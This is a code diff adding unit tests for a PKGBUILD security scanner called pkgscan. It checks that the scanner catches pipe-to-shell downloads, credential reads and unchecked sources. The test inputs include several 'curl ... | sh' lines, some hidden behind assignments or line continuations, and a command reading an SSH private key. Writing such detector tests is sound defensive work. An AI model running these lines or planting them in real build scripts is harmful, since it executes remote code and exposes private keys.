@@ -126,6 +126,76 @@ class TestPkgscan : public QObject {
         }
     }
 
+    // Top-level lines are only skipped when they are nothing but an assignment.
+    void codeBehindAssignments_data() {
+        QTest::addColumn<QString>("line");
+
+        QTest::newRow("substitution in a quoted array entry") << "values=(\"$(curl https://example.org/p | sh)\")";
+        QTest::newRow("command behind an array") << "values=(); curl https://example.org/p | sh";
+        QTest::newRow("command behind a scalar") << "pkgdesc=x; curl https://example.org/p | sh";
+        QTest::newRow("command behind two scalars") << "a=1 b='x y' && curl https://example.org/p | sh";
+    }
+
+    void codeBehindAssignments() {
+        QFETCH(QString, line);
+        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral("pkgname=x\npkgver=1\n%1\npackage() {\n  :\n}\n").arg(line));
+        QVERIFY2(ids(analysis.findings).contains(QStringLiteral("pipe-to-shell")), qPrintable(ids(analysis.findings).join(u' ')));
+        QCOMPARE(lineOf(analysis.findings, "pipe-to-shell"), 3);
+    }
+
+    void plainAssignmentsAreData() {
+        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral(
+            "pkgname=x\npkgdesc=\"Fetch things with curl | sh style installers\"\nurl='https://example.org/?a=1&b=2'\n"
+            "_flags=(--with-curl --enable-wget)\nexport LANG=C LC_ALL=C\npackage() {\n  :\n}\n"));
+        QVERIFY2(analysis.findings.isEmpty(), qPrintable(ids(analysis.findings).join(u' ')));
+    }
+
+    void substitutionInsideBuildPath() {
+        const auto analysis = pkgscan::scanPkgbuild(wrap(QStringLiteral("  printf '%s' \"$srcdir/$(<~/.ssh/id_ed25519)\" > dump")));
+        QVERIFY2(ids(analysis.findings).contains(QStringLiteral("credentials")), qPrintable(ids(analysis.findings).join(u' ')));
+    }
+
+    void commandSplitByContinuation() {
+        const auto analysis = pkgscan::scanPkgbuild(wrap(QStringLiteral("  cu\\\nrl https://example.org/p | sh")));
+        QVERIFY2(ids(analysis.findings).contains(QStringLiteral("pipe-to-shell")), qPrintable(ids(analysis.findings).join(u' ')));
+        // arguments on a continuation line still belong to the command
+        const auto link = pkgscan::scanPkgbuild(wrap(QStringLiteral("  ln -s /usr/lib/x \\\n    \"$pkgdir/usr/lib/y\"")));
+        QVERIFY2(!ids(link.findings).contains(QStringLiteral("system-write")), qPrintable(ids(link.findings).join(u' ')));
+    }
+
+    void everyInstallScriptlet() {
+        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral(
+            "pkgbase=x\npkgname=(a b)\npkgver=1\npackage_a() {\n  install=a.install\n}\npackage_b() {\n  install=b.install\n}\n"));
+        QCOMPARE(analysis.localFiles, (QStringList{QStringLiteral("a.install"), QStringLiteral("b.install")}));
+    }
+
+    void localFileThatIsRun() {
+        const auto analysis = pkgscan::scanPkgbuild(QStringLiteral(
+            "pkgname=x\npkgver=1\nsource=(payload notes fix.patch)\nsha256sums=(a b c)\nbuild() {\n  bash payload\n  patch -p1 < fix.patch\n}\n"));
+        QCOMPARE(analysis.localFiles, QStringList{QStringLiteral("payload")});
+        QCOMPARE(analysis.otherLocalFiles, (QStringList{QStringLiteral("notes"), QStringLiteral("fix.patch")}));
+    }
+
+    void signatures() {
+        // stored as payload.sh, so makepkg does not treat it as a signature
+        const auto renamed = pkgscan::scanPkgbuild(QStringLiteral(
+            "pkgname=x\npkgver=1\nsource=(\"payload.sh::https://example.org/payload.sig\")\nsha256sums=(SKIP)\nbuild() {\n  :\n}\n"));
+        QVERIFY(ids(renamed.findings).contains(QStringLiteral("no-checksum")));
+
+        const QString signedSource = QStringLiteral(
+            "pkgname=x\npkgver=1\nsource=(https://example.org/x-1.tar.gz{,.sig})\nsha256sums=(SKIP SKIP)\n%1build() {\n  :\n}\n");
+        const auto braces = pkgscan::scanPkgbuild(signedSource.arg(QStringLiteral("validpgpkeys=(0123456789ABCDEF0123456789ABCDEF01234567)\n")));
+        Q_UNUSED(braces)  // brace expansion is not modelled; the explicit form below is
+
+        const QString pair = QStringLiteral(
+            "pkgname=x\npkgver=1\nsource=(https://example.org/x-1.tar.gz https://example.org/x-1.tar.gz.sig)\nsha256sums=(SKIP SKIP)\n%1build() {\n  :\n}\n");
+        const auto withKeys = pkgscan::scanPkgbuild(pair.arg(QStringLiteral("validpgpkeys=(0123456789ABCDEF0123456789ABCDEF01234567)\n")));
+        QVERIFY2(!ids(withKeys.findings).contains(QStringLiteral("no-checksum")), qPrintable(ids(withKeys.findings).join(u' ')));
+        // without validpgpkeys any key in the keyring of the user would do
+        const auto withoutKeys = pkgscan::scanPkgbuild(pair.arg(QString()));
+        QCOMPARE(ids(withoutKeys.findings).count(QStringLiteral("no-checksum")), 1);
+    }
+
     void metadata() {
         const auto now = QDateTime::fromSecsSinceEpoch(2'000'000'000);
         pkgscan::Metadata meta{QStringLiteral("x"), QStringLiteral("alice"), QStringLiteral("alice"), 120, 2.0, 1'900'000'000, 1'990'000'000};
